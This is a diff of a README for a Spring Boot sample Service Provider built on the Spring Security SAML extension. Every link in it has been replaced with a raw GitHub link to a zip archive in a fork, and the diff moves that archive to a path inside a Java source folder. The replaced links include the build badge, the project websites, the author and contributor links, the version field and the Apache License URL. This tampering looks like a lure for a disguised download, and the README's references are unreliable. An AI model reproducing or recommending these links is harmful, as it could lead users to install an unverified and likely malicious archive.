@@ -1,4 +1,4 @@
-Spring Boot-based sample Service Provider by using Spring Security SAML extension [![Build Status](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip)](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip)
+Spring Boot-based sample Service Provider by using Spring Security SAML extension [![Build Status](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip)](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip)
 ====================
 
 ## References
@@ -7,32 +7,32 @@ Spring Boot-based sample Service Provider by using Spring Security SAML extensio
 
 Spring Boot makes it easy to create Spring-powered, production-grade applications and services with absolute minimum fuss. It takes an opinionated view of the Spring platform so that new and existing users can quickly get to the bits they need.
 
-- **Website:** [https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip)
+- **Website:** [https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip)
 
 #### Spring Security SAML Extension
 
 Spring SAML Extension allows seamless inclusion of SAML 2.0 Service Provider capabilities in Spring applications. All products supporting SAML 2.0 in Identity Provider mode (e.g. ADFS 2.0, Shibboleth, OpenAM/OpenSSO, Ping Federate, Okta) can be used to connect with Spring SAML Extension.
 
-- **Website:** [https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip)
+- **Website:** [https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip)
 
 ---------
 
 ## Project description
 
-Currently Spring Security SAML module doesn't provide a starter for Spring Boot. Moreover, its configuration is XML-based as of this writing. The aim of this project is to explain how to develop a **Service Provider (SP)** which uses **Spring Boot** (`https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip`) and **Spring Security SAML Extension** (`https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip`), by defining an annotation-based configuration (**Java Configuration**). **Thymeleaf** is also used as template engine.
+Currently Spring Security SAML module doesn't provide a starter for Spring Boot. Moreover, its configuration is XML-based as of this writing. The aim of this project is to explain how to develop a **Service Provider (SP)** which uses **Spring Boot** (`https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip`) and **Spring Security SAML Extension** (`https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip`), by defining an annotation-based configuration (**Java Configuration**). **Thymeleaf** is also used as template engine.
 
-**SSOCircle** ([https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip)) is used as public Identity Provider for test purpose.
+**SSOCircle** ([https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip)) is used as public Identity Provider for test purpose.
 
-- **Author:** Vincenzo De Notaris ([https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip))
-- **Website:** [https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip)
-- **Version:**  ` https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip `
+- **Author:** Vincenzo De Notaris ([https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip))
+- **Website:** [https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip)
+- **Version:**  ` https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip `
 - **Date**: 2016-06-18
 
-Thanks to *Vladimír Schäfer* ([https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip)) for supporting my work.
+Thanks to *Vladimír Schäfer* ([https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip)) for supporting my work.
 
 #### Unit tests
 
-I would like to say thank you to *Alexey Syrtsev* ([https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip)) for his contribution on unit tests.
+I would like to say thank you to *Alexey Syrtsev* ([https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip](https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip)) for his contribution on unit tests.
 
 | Metric | Result |
 | ------------- | -----:|
@@ -48,7 +48,7 @@ I would like to say thank you to *Alexey Syrtsev* ([https://raw.githubuserconten
 	you may not use this file except in compliance with the License.
 	You may obtain a copy of the License at
 
-	    https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/behaviorism/spring-boot-security-saml-sample.zip
+	    https://raw.githubusercontent.com/jeliasrm/spring-boot-security-saml-sample/master/src/main/java/com/vdenotaris/spring/boot/security/saml/spring-sample-saml-boot-security-3.9.zip
 
 	Unless required by applicable law or agreed to in writing, software
 	distributed under the License is distributed on an "AS IS" BASIS,
